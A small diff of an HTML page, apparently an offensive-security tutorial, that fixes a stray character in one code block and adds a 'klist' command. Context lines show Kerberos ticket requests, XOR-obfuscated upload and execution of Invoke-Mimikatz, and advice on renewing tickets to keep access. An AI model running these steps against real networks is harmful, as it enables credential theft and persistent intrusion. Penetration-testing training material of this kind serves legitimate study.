@@ -477,7 +477,7 @@ tgs = getKerberosTGS(spn, domain, kdcHost, tgt, cipher, sessionKey)</code></pre>
 
                 <pre><code class="language-powershell">PS C:\Users\Administrator\Documents> !upload -xor Invoke-Mimikatz.ps1 C:\Temp\script.ps1</code></pre>
 
-                <pre><code class="language-powershell">>PS C:\Users\Administrator\Documents> !psrun -xor C:\Temp\script.ps1</code></pre>
+                <pre><code class="language-powershell">PS C:\Users\Administrator\Documents> !psrun -xor C:\Temp\script.ps1</code></pre>
 
                 <h2>.NET Assembly Execution</h2>
 
@@ -750,6 +750,8 @@ tgs, cipher, session_key_tgs = getKerberosTGS(
                 <p>Kerberos tickets have defined validity periods. Monitor ticket expiration:</p>
 
                 <pre><code class="language-bash">klist -c administrator.ccache</code></pre>
+
+                <pre><code class="language-bash">klist</code></pre>
 
                 <p>Tickets typically <ins>expire after 10 hours</ins> by default. Renew or obtain fresh tickets before expiration to maintain access.</p>
 
